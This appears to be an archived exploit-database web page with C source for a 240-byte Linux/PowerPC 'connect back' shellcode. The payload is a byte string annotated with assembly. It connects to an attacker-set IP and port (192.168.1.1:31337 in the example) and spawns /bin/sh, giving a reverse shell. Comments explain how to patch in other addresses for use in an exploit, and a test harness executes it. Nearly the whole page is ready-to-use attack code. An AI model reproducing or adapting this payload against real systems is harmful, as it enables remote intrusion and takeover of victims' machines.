<html><head><title>Linux/ppc - connect back execve /bin/sh - 240 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* connect-core5.c by Charles Stevenson &lt; core@bokeoa.com &gt; */
char hellcode[] = /* connect back &amp; execve /bin/sh linux/ppc by core */
&quot;\x7c\x3f\x0b\x78&quot;	/*mr	r31,r1*/
&quot;\x3b\x40\x01\x0e&quot;	/*li	r26,270*/
&quot;\x3b\x5a\xfe\xf4&quot;	/*addi	r26,r26,-268*/
&quot;\x7f\x43\xd3\x78&quot;	/*mr	r3,r26*/
&quot;\x3b\x60\x01\x0d&quot;	/*li	r27,269*/
&quot;\x3b\x7b\xfe\xf4&quot;	/*addi	r27,r27,-268*/
&quot;\x7f\x64\xdb\x78&quot;	/*mr	r4,r27*/
&quot;\x7c\xa5\x2a\x78&quot;	/*xor	r5,r5,r5*/
&quot;\x7c\x3c\x0b\x78&quot;	/*mr	r28,r1*/
&quot;\x3b\x9c\x01\x0c&quot;	/*addi	r28,r28,268*/
&quot;\x90\x7c\xff\x08&quot;	/*stw	r3,-248(r28)*/
&quot;\x90\x9c\xff\x0c&quot;	/*stw	r4,-244(r28)*/
&quot;\x90\xbc\xff\x10&quot;	/*stw	r5,-240(r28)*/
&quot;\x7f\x63\xdb\x78&quot;	/*mr	r3,r27*/
&quot;\x3b\xdf\x01\x0c&quot;	/*addi	r30,r31,268*/
&quot;\x38\x9e\xff\x08&quot;	/*addi	r4,r30,-248*/
&quot;\x3b\x20\x01\x98&quot;	/*li	r25,408*/
&quot;\x7f\x20\x16\x70&quot;	/*srawi	r0,r25,2*/
&quot;\x44\xde\xad\xf2&quot;	/*.long 0x44deadf2*/
&quot;\x7c\x78\x1b\x78&quot;	/*mr	r24,r3*/
&quot;\xb3\x5e\xff\x16&quot;	/*sth	r26,-234(r30)*/
&quot;\x7f\xbd\xea\x78&quot;	/*xor	r29,r29,r29*/
// Craft your exploit to poke these value in. Right now it's set
// for port 31337 and ip 192.168.1.1. Here's an example
// core@morpheus:~$ printf &quot;0x%02x%02x\n0x%02x%02x\n&quot; 192 168 1 1
// 0xc0a8
// 0x0101
&quot;\x63\xbd&quot; /* PORT # */ &quot;\x7a\x69&quot;	/*ori	r29,r29,31337*/
&quot;\xb3\xbe\xff\x18&quot;	/*sth	r29,-232(r30)*/
&quot;\x3f\xa0&quot; /*IP(A.B) */ &quot;\xc0\xa8&quot;	/*lis	r29,-16216*/
&quot;\x63\xbd&quot; /*IP(C.D) */ &quot;\x01\x01&quot;	/*ori	r29,r29,257*/
&quot;\x93\xbe\xff\x1a&quot;	/*stw	r29,-230(r30)*/
&quot;\x93\x1c\xff\x08&quot;	/*stw	r24,-248(r28)*/
&quot;\x3a\xde\xff\x16&quot;	/*addi	r22,r30,-234*/
&quot;\x92\xdc\xff\x0c&quot;	/*stw	r22,-244(r28)*/
&quot;\x3b\xa0\x01\x1c&quot;	/*li	r29,284*/
&quot;\x38\xbd\xfe\xf4&quot;	/*addi	r5,r29,-268*/
&quot;\x90\xbc\xff\x10&quot;	/*stw	r5,-240(r28)*/
&quot;\x7f\x20\x16\x70&quot;	/*srawi	r0,r25,2*/
&quot;\x7c\x7a\xda\x14&quot;	/*add	r3,r26,r27*/
&quot;\x38\x9c\xff\x08&quot;	/*addi	r4,r28,-248*/
&quot;\x44\xde\xad\xf2&quot;	/*.long0x44deadf2*/
&quot;\x7f\x03\xc3\x78&quot;	/*mr	r3,r24*/
&quot;\x7c\x84\x22\x78&quot;	/*xor	r4,r4,r4*/
&quot;\x3a\xe0\x01\xf8&quot;	/*li	r23,504*/
&quot;\x7e\xe0\x1e\x70&quot;	/*srawi	r0,r23,3*/
&quot;\x44\xde\xad\xf2&quot;	/*.long 0x44deadf2*/
&quot;\x7f\x03\xc3\x78&quot;	/*mr	r3,r24*/
&quot;\x7f\x64\xdb\x78&quot;	/*mr	r4,r27*/
&quot;\x7e\xe0\x1e\x70&quot;	/*srawi	r0,r23,3*/
&quot;\x44\xde\xad\xf2&quot;	/*.long 0x44deadf2*/
// comment out the next 4 lines to save 16 bytes and lose stderr
//&quot;\x7f\x03\xc3\x78&quot;	/*mr	r3,r24*/
//&quot;\x7f\x44\xd3\x78&quot;	/*mr	r4,r26*/
//&quot;\x7e\xe0\x1e\x70&quot;	/*srawi	r0,r23,3*/
//&quot;\x44\xde\xad\xf2&quot;	/*.long 0x44deadf2*/
&quot;\x7c\xa5\x2a\x79&quot;	/*xor.	r5,r5,r5*/
&quot;\x42\x40\xff\x35&quot;	/*bdzl+	10000454&lt; main&gt;*/
&quot;\x7f\x08\x02\xa6&quot;	/*mflr	r24*/
&quot;\x3b\x18\x01\x34&quot;	/*addi	r24,r24,308*/
&quot;\x98\xb8\xfe\xfb&quot;	/*stb	r5,-261(r24)*/
&quot;\x38\x78\xfe\xf4&quot;	/*addi	r3,r24,-268*/
&quot;\x90\x61\xff\xf8&quot;	/*stw	r3,-8(r1)*/
&quot;\x38\x81\xff\xf8&quot;	/*addi	r4,r1,-8*/
&quot;\x90\xa1\xff\xfc&quot;	/*stw	r5,-4(r1)*/
&quot;\x3b\xc0\x01\x60&quot;	/*li	r30,352*/
&quot;\x7f\xc0\x2e\x70&quot;	/*srawi	r0,r30,5*/
&quot;\x44\xde\xad\xf2&quot;	/*.long 0x44deadf2*/
&quot;/bin/shZ&quot;;	/* Z will become NULL */

int main(void)
{
  void (*shell)() = (void *)&amp;hellcode;
  printf(&quot;%d byte connect back execve /bin/sh for linux/ppc by core\n&quot;,
          strlen(hellcode));
  shell();
  return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
